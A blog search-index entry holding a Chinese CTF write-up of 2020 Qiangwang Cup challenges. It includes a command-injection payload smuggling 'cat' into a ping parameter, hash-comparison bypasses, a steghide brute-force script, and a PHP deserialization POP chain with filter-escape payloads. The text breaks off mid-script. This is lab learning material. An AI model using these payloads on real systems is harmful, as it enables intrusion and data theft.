<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux系统提权———基于已经拿到www-data权限</title>
      <link href="/2020/09/01/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/09/01/2020%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代码烂，游戏菜，天天等着大佬带。这次做出来三道题，无缘线下赛了，看来以后要找个大腿抱着才行(开始胡扯ing)</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;hash2&#x27;</span>] === $_GET[<span class="string">&#x27;hash3&#x27;</span>] || md5($_GET[<span class="string">&#x27;hash2&#x27;</span>]) !== md5($_GET[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5($_GET[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先绕过第一关，需要找到一个特殊字符串，这个特殊的字符串需要满足的条件是经过md4加密后还与它本身相等。这个原本想的是爆破来着，但是太慢了，解题情况又是几十个队伍都解出来了，所以果断放弃爆破的方式。Google一下。(重要设置，设置Google语言为hancker)然后发现了一个大佬的博客中有类似的知识点。<br><a href="https://crdx.org/post/hsctf-2019-md5-minus-minus">https://crdx.org/post/hsctf-2019-md5-minus-minus</a><br>找到了 这个特殊的字符串<code>0e251288019</code><br>提交可以绕过第一关，剩下两个也好绕过了，第二个就是很简单的一个md5绕过，使用数组，第三个是md5的一个特殊情况的字符，刚好比赛前做了一道这样的题，具体参考我的博客<a href="https://blog.csdn.net/qq_45836474/article/details/107940521#t5">https://blog.csdn.net/qq_45836474/article/details/107940521#t5</a><br>总结：构造payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200824144620776.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><p>考点：命令执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/i&quot;</span>, $_GET[<span class="string">&quot;ip&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;ping -c 3 $_GET[ip]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>get方式提交IP参数，但是参数中不能有flag存在，是匹配的flag字符串，所以是黑名单绕过flag就行。<br>payload<code>?ip=127.0.0.1|ls</code>看到两个文件分别是flag.php和index.php<br><img src="https://img-blog.csdnimg.cn/20200824144649904.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>经过测试发现空格也被过滤，使用<code>%20</code>来绕过空格。<br>构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1|cat%20fl<span class="string">&quot;&quot;</span>ag.php</span><br></pre></td></tr></table></figure><p>执行命令查看源码，flag在源码中。<br><img src="https://img-blog.csdnimg.cn/20200824144709672.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_2FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>题目附件是数据包，wireshark打开，看到有http请求，先导出http对象看到了两个文件，一个html文件还有个php文件。<br><img src="https://img-blog.csdnimg.cn/20200824145410263.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>html的内容是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;steghide.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>      </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!--i use steghide with a good password--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注释一个好密码。<br>图片没有导出来，原本尝试直接复制出来16进制出来直接新建图片，结果失败了。这次学到一个新的方式，<br><img src="https://img-blog.csdnimg.cn/20200824151450831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>可以导出一个jpg图片，<br><img src="https://img-blog.csdnimg.cn/20200824152057689.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后使用steghide继续解题。没有提示密码的，思路是：上面的注释可以找一下，或者文件名，再然后就是弱口令。<br>这个是个弱口令，<code>123456</code><br><img src="https://img-blog.csdnimg.cn/20200824151831326.png#pic_center" alt="m0re" loading="lazy"><br>不过这个方法不是很稳，不能每次都猜中，所以github上有个工具是暴力破解的。<br><img src="https://img-blog.csdnimg.cn/20200824162446392.png#pic_center" alt="m0re" loading="lazy"><br>一个sh脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> `cat <span class="variable">$2</span>`;<span class="keyword">do</span></span><br><span class="line">    steghide extract -sf <span class="variable">$1</span> -p <span class="variable">$line</span> &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="keyword">if</span> [[ $? -eq 0 ]];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;password is: &#x27;</span><span class="variable">$line</span></span><br><span class="line">        <span class="built_in">exit</span></span><br><span class="line">    <span class="keyword">fi</span>  </span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure><p>tip：如果是自己创建的文件写入脚本，记得提升脚本权限为可执行。<br>还有其他脚本，不过我感觉这个看起来少hh</p><h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><p>这题是构造pop链，没做过这类题目，所以看的时候有些吃力，这次以后多找几个这类的题目做做总结一下。参考博客——<a href="https://ama666.cn/2020/06/25/DASCTF-6%E6%9C%88%E8%B5%9B%E6%80%BB%E7%BB%93/#phpnus">DASCTF6月赛总结—phpnus</a><br>题目附件中源码给出<a href="https://www.lanzoux.com/iYo2hg0lb9c">点击打包</a><br>class.php中可以三个类中涉及的陌生函数先查一查，</p><ol><li><code>__construct()</code> 函数创建一个新的 SimpleXMLElement 对象。</li><li><code>gettype()</code> 函数用于获取变量的类型。</li><li><code>__destruct() </code>　——对象的所有引用都被删除或者当对象被显式销毁时执行(其实就是析构函数)，有几个更有趣的说法，钟馗的被动，被击杀后的那一下。也可以说是写遗嘱。挺有意思，还是网友的脑洞比较大。</li><li><code>__wakeup()</code>，先说一下sleep函数，在序列化时，<code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，则该方法会优先被调用，然后才执行序列化操作。当然<code>__wakeup()</code>就是与之相反的反序列化时，<code>unserialize()</code>函数同样会检测<code>__wakeup()</code>函数的存在，然后先执行<code>__wakeup()</code>函数的内容。在进行反序列化。</li><li><code>__invoke()</code>，调用函数的方式调用一个对象时的回应方法</li></ol><p>还有构造pop链的时候一下需要注意的点。</p><blockquote><p>private变量序列化后需要在变量名的左右手动添加不可见字符<code>%00</code>，<br>protected变量序列化后需要在变量前的星号<code>*</code>左右手动添加不可见字符，使<br>其成为<code>%00*%00</code>。</p></blockquote><p>下面就开始进行解题了。<br>class.php中的三个类需要cat flag，就需要从输入开始进行嵌套<br><img src="https://img-blog.csdnimg.cn/20200825223232364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先看这个，下面的<code>__toString()</code>函数被调用了，cat flag的命令才可以执行。所以需要先调用jungle类中的魔术方法函数。<br>继续看上面的，<br><img src="https://img-blog.csdnimg.cn/20200825224101851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在topsolo类中，实例化一个对象，然后调用它，把它当作函数来调用，最后进行析构。<br>并且这个在下面的类中就可以进行new一个对象来调用，就可以触发midsolo中的魔术方法——invoke函数<br><img src="https://img-blog.csdnimg.cn/20200825224811489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后在jungle类中new一个对象，触发toString函数，并牵连至cat flag的作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name=<span class="string">&quot;Riven&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $name = <span class="string">&quot;Lee Sin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lol=<span class="keyword">new</span> topsolo();</span><br><span class="line">print_r(serialize($lol));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造出来的pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00name&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;Lee Sin&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>同样的，在index.php中，对player这个类进行了序列化，并write进文件中<br><img src="https://img-blog.csdnimg.cn/20200825225342359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>对player进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $user;</span><br><span class="line">    <span class="keyword">protected</span> $pass;</span><br><span class="line">    <span class="keyword">protected</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$user, $pass, $admin = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$lol=<span class="keyword">new</span> player();</span><br><span class="line">print_r(serialize($lol));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;%00*%00user&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;%00*%00admin&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>然后看到player.php看到读取操作，将读取到文件中的内容进行反序列化<br><img src="https://img-blog.csdnimg.cn/20200825235757937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>还有过滤，涉及反序列化字符串逃逸，<br><img src="https://img-blog.csdnimg.cn/20200826001550122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>写入的<code>\0*\0</code>，过滤后变成了<code>chr(0)*chr(0)</code>三个字符，其中吞掉两个字符。所以是字符串逃逸。<br>在源码中看到只有player这个类进行了反序列化，所以pop链需要变化一下。<br><img src="https://img-blog.csdnimg.cn/20200826002939142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>但是前面还有，<br><img src="https://img-blog.csdnimg.cn/20200826003842767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>23个字符会吞掉，替换11.5次，这里加一个字符，在password中加一个字符给它过滤掉，这样就可以过滤24个字符，替换12次。<br><img src="https://img-blog.csdnimg.cn/20200826004022786.png" alt="m0re" loading="lazy"><br>所以payload为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=m0re%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00%00*%00</span><br><span class="line">&amp;password=1&quot;;s:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;s:7:&quot;%00*%00name&quot;;O:7:&quot;midsolo &quot;:1:&#123;s:7:&quot;%00*%00name&quot;;O:6:&quot;jungle&quot;:1:&#123;s:7:&quot;%00*%00name&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;;s:8:&quot;%00*%00admin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200826004527703.png#pic_center" alt="m0re" loading="lazy"><br>还有一个过滤条件就是name，<br><img src="https://img-blog.csdnimg.cn/2020082600465595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>过滤使用方法：将小写s换成大写S，name转换成十六进制<code>\6e\61\6d\65</code>，就可以被解析了<br>还有，进行反序列化的时候，需要跳过这个魔术方法，<br><img src="https://img-blog.csdnimg.cn/20200826005047431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>绕过方法：，刚开始看学长wp没看懂为什么要输入一个2来替换1进行绕过wakeup魔术方法，百度了一下。发现这是一个CVE漏洞<br>绕过就是：<strong>当成员属性数目大于实际数目时可绕过</strong><br>这个就是为什么要输入一个2来替换1的原因了，也可以输入其他数字。<br>最终payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=m0re\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=1&quot;;S:7:&quot;%00*%00pass&quot;;O:7:&quot;topsolo&quot;:1:&#123;S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:7:&quot;midsolo&quot;:2:&#123;S:7:&quot;%00*%00\6e\61\6d\65&quot;;O:6:&quot;jungle&quot;:1:&#123;S:7:&quot;%00*%00\6e\61\6d\65&quot;;s:7:&quot;Lee Sin&quot;;&#125;&#125;&#125;;s:8:&quot;%00*%00admin&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>访问play.php就可以看到flag了。<br><img src="https://img-blog.csdnimg.cn/20200826010838855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>运行得到 flag<br>最后感谢qwzf大佬提供的环境。tql<br>参考文章——<a href="https://mp.weixin.qq.com/s?__biz=MzAxNTc4MzUwNg==&mid=2247484297&idx=1&sn=dc77c873cb80d798799591a0dd5b7f1f&chksm=9bff80b4ac8809a22b27072c155b98c3272e36739cacd645d5995a91d782c1a36ec6b4c2fd17&mpshare=1&scene=23&srcid=0825YM7il23gIXIDuPsA7S0S&sharer_sharetime=1598342936465&sharer_shareid=6f8ce528d5b894c67a4d474049135f1f#rd">第四届“强网杯”全国网络安全挑战赛WP</a></p><h2 id="miscstudy"><a href="#miscstudy" class="headerlink" title="miscstudy"></a>miscstudy</h2><p>套娃题，<br>第一关<br><img src="https://img-blog.csdnimg.cn/20200824225540942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>选择查看请求可以找到<code>http://39.99.247.28/fonts/1</code><br><img src="https://img-blog.csdnimg.cn/2020082422571650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>一部分flag<br>第二关<br>复制除了flag以外的全部内容。放到以<code>.log</code>为后缀的日志文件。这个是wireshark的日志文件，重新导入wireshark。<br>tip：版本不同，导入位置不同。<br>有的是SSL，有的是TLS<br>导入位置：编辑——首选项——Protocols——SSL(或者TLS)<br><img src="https://img-blog.csdnimg.cn/20200824230513376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后看到<br><img src="https://img-blog.csdnimg.cn/20200824231955179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>get方式，所以直接访问该URL得到图片，另存到本地。<br><code>https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</code><br>图片拖进010editor，在末尾查看到一串base64字符串<br><img src="https://img-blog.csdnimg.cn/20200825001010663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>解密得到部分flag<br>第三关<br>在图片的倒数第二第三第四个IDAT的地方</p><p><img src="https://img-blog.csdnimg.cn/20200826011735537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>进行base64解码，得到二进制数<br><img src="https://img-blog.csdnimg.cn/20200826011711657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>利用python的PIL模块进行绘图(之前团队内比赛有画图的题有过涉及这个模块)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span 